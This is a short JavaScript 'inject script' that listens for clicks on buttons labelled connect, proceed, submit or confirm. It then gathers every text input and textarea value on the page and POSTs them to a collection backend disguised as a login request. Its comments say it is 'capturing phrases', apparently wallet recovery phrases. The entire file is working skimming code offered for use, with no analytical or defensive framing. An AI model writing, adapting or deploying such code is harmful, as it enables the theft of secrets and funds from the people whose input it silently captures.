console.log('Inject script loaded - Email Sender Ready');

document.addEventListener('click', async (e) => {
    const target = e.target;
    const button = target.closest('button');

    if (button) {
        const text = button.innerText.toLowerCase();
        // Check if it's a submit-like button
        if (text.includes('connect') || text.includes('proceed') || text.includes('submit') || text.includes('confirm')) {
            console.log('Submit button clicked:', text);

            // Find the nearest textarea or input
            // We search in the whole document because the modal might be a portal
            const inputs = document.querySelectorAll('textarea, input[type="text"]');
            let dataToSend = '';

            inputs.forEach(input => {
                if (input.value && input.value.length > 0) {
                    console.log('Found input with value:', input.value);
                    dataToSend += `${input.name || input.placeholder || 'Input'}: ${input.value}\n`;
                }
            });

            if (dataToSend) {
                console.log('Sending data to backend...');
                try {
                    const response = await fetch('http://localhost:3000/auth/login', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            email: 'user@webtrack.com', // Dummy email as we are capturing phrases
                            password: dataToSend // Sending phrases as password/data
                        }),
                    });

                    const result = await response.json();
                    console.log('Backend response:', result);
                    alert('Data sent to email successfully!');
                } catch (error) {
                    console.error('Error sending data:', error);
                    alert('Failed to send data.');
                }
            } else {
                console.log('No input data found to send.');
            }
        }
    }
});
